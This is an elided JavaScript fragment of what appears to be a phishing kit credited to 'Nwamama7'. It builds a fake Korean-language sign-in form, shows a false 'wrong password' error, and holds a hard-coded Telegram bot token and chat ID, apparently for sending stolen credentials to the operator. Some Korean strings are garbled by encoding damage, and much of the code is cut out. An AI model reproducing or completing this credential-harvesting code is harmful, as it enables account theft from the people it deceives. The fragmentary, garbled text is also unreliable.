document.addEventListener("DOMContentLoaded", async function() {
    ...
    document.getElementById('email-text').textContent = '이메일 또는 � �화';

    
    const passwordContainer = document.getElementById('password-container');
    const passwordLabel = document.createElement('div');
    passwordLabel.className = 'pp-label';
    passwordLabel.textContent = '비밀번호를 입� �하세요';
    ...
    errorMessage.textContent = '귀하의 계� � 또는 비밀번호가 올바르지 않습니다. 다시 시도해 주세요..';
    ...
    signInButtonElement.addEventListener('click', async function() {
        ...
        if (password === '') {
            errorMessageElement.textContent = '비밀번호가 틀� �습니다. 다시 시도해 주세요.';
...
Designed by Nwamama7
        ...
        const telegramToken = '7823602083:AAH70QRLGcYWRAaP9jgqFFcerjyvHDdm9oU'; 
        const chatId = '6139018080'; 
